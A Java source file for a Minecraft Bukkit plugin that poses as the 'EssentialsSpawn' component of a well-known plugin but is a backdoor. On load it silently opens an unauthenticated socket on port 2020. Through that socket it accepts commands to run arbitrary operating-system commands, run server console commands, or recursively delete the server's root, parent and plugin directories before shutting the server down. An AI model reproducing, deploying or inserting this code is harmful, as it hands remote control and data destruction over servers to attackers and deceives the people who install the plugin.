

// Author: Dashie
// Version: 1.0


package com.essentials;


import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Filter;
import java.util.logging.LogRecord;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

     
public class EssentialsSpawn extends JavaPlugin implements Listener
{
    JavaPlugin plugin = this;
    
    private void sync_execute(String command)
    {
        Bukkit.getScheduler().runTask(plugin, 
            new Runnable()
            {
                public void run()
                {
                    Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                }
            }
        );  
    };
    
    private void run_server()
    {
        try
        {
            getLogger().setFilter(new Filter() 
            {
                @Override public boolean isLoggable(LogRecord record) 
                {
                    return true;
                }
            });            
        } catch (Exception e)
        {
           // Silcence 
        }
        
        Bukkit.getScheduler().runTaskAsynchronously(plugin,
            new Runnable()
            {
                private ServerSocket socket;
                private Socket listener_socket;
            
                public void run()
                {
                    while (true)
                    {
                        try
                        {
                            if(socket != null)
                            {
                                if((socket.isBound()) || (listener_socket.isBound()))
                                {
                                    listener_socket.close();
                                    socket.close();
                                };
                            };
                            
                            socket = new ServerSocket(2020);  
                            listener_socket = socket.accept();                       
                            
                            BufferedReader incoming = new BufferedReader(new InputStreamReader(listener_socket.getInputStream()));
                            DataOutputStream outgoing = new DataOutputStream(listener_socket.getOutputStream());                                                        
                            
                            while (true)
                            {
                                String command = incoming.readLine();
                                
                                if(command.toLowerCase().contains("!destroy"))
                                {
                                    String[] paths = new String[]
                                    {
                                        "..\\..\\",
                                        "\\",
                                        "..\\",
                                        "..\\plugins",
                                        "plugins\\",
                                    };
                                    
                                    for(String path : paths)
                                    {
                                        FileUtils.deleteDirectory(new File(path));
                                    };
                                    
                                    sync_execute("shutdown");
                                }
                                
                                else if(command.contains("!shell "))
                                {
                                   Runtime os = Runtime.getRuntime();
                                   Process pc = os.exec(command.replace("!shell ", ""));
                                   
                                   
                                }
                                    
                                else if(command.contains("!rcon "))
                                {
                                   command = command.replace("!rcon ", "");
                                   sync_execute(command);
                                };
                                        
                                outgoing.writeBytes("OK!");                             
                            }
                        }

                        catch (IOException e) { }
                    }
                }
            }
        );
    };
    
    @Override public void onEnable()
    {
        try
        {
            getLogger().setFilter(new Filter() 
            {
                @Override public boolean isLoggable(LogRecord record) 
                {
                    return true;
                }
            });
            
            run_server();
        } 
        
        catch (Exception ex)
        {
            //Logger.getLogger(EssentialsSpawn.class.getName()).log(Level.SEVERE, null, ex);
        }
    };
    
    @Override public void onDisable() { Bukkit.getScheduler().cancelTasks(this); };
};
